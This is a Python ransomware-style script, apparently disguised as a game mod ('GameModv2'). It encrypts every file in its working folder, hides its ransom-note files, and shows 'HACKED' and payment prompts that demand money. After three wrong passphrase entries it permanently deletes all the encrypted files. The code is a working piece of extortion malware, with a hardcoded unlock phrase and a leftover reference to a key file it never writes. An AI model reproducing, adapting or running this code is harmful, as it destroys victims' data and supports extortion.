#!/usr/bin/env python3

# sudo apt install python3-pip -y       #linux system
# pip install -r requirements.txt


import os
# pip install cryptography
from cryptography.fernet import Fernet

from tkinter import * 
from tkinter import messagebox
from tkinter.simpledialog import askstring
from PIL import Image, ImageTk

root = Tk()
root.geometry("800x500+250+5")
root.title('HACKED')  

# Create a photoimage object of the image in the path
image1 = Image.open("./hacked2.jpg")
test = ImageTk.PhotoImage(image1)
label1 = Label(image=test)
label1.image = test
# Position image
label1.place(x=0, y=0)
# root.mainloop()

files = []
impfiles = ("GameModv2.py", "GameModv2.exe", "bitcoin.html", "hacked2.jpg", "qr-code.jpg")
global count, flag  #, check
flag = 0
# check = 0

for file in os.listdir():
    if file in impfiles:
        continue
    if os.path.isfile(file):    #ignore folders
        files.append(file)
    
# print(files)

# KEY
key = Fernet.generate_key()
# with open("thekey.key", "wb") as thekey:
#     thekey.write(key)

# alt+enter     shortcut to file properties
# hide files
os.system( "attrib +h bitcoin.html")
os.system( "attrib +h qr-code.jpg")
os.system( "attrib +h hacked2.jpg")


# ENCRYPT
if(flag == 0):
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()

        content_encrypted = Fernet(key).encrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)

    flag = 1
    print("You have been HACKED!\nAll your files have been encrypted!, Send money or i'll delete them")   
    # os.system("./hacked2.jpg") 
    messagebox.showerror(title="ERROR", message="All your files have been Encrypted!\nSend Money...$$ or I'll Delete them!")




def getString():
    global count, userkey


# DECRYPT
count = 2
while(count!=0 and flag==1):        
    global userkey
    # userkey = StringVar()

    # userkey = input("Enter the secret key to decrypt your files\n")
    # passw_label = Label(root, text="Enter the secret key to decrypt your files\n", font=('calibre',10, 'bold'))
    # passw_entry = Entry(root, textvariable=userkey, width=20)
    # sub_btn = Button(root,text = 'Submit', command = getString)

    # passw_label.grid(row=0,column=0)
    # passw_entry.grid(row=0,column=1)
    # sub_btn.grid(row=1,column=1)

    os.system(".\\bitcoin.html")
    userkey = askstring('Decrypt', 'Enter the secret key to decrypt your files')
    

    if userkey == "Happy?":       
        for file in files:
            with open(file, "rb") as thefile:
                content = thefile.read()

            content_decrypted = Fernet(key).decrypt(content)

            with open(file, "wb") as thefile:
                thefile.write(content_decrypted)

        # root.wait_visibility()
        messagebox.showinfo("Message", "Sucessfully Decrypted")
        print("Sucessfully Decrypted")
        os.remove("thekey.key")
        break
    else:
        # root.wait_visibility()
        messagebox.showwarning(title="WARNING", message=f"Warning!... Will Delete all files in next {count} Incorrect tries\n")
        print(f"Warning!... Will Delete all files in next {count} Incorrect tries")
        count -= 1


    if count == 0:
        for file in files:
            os.remove(file)
        # root.wait_visibility()
        messagebox.showerror(title="ERROR", message="Deleted all files!")
        print("Deleted all files!\n")
        quit()


root.mainloop()
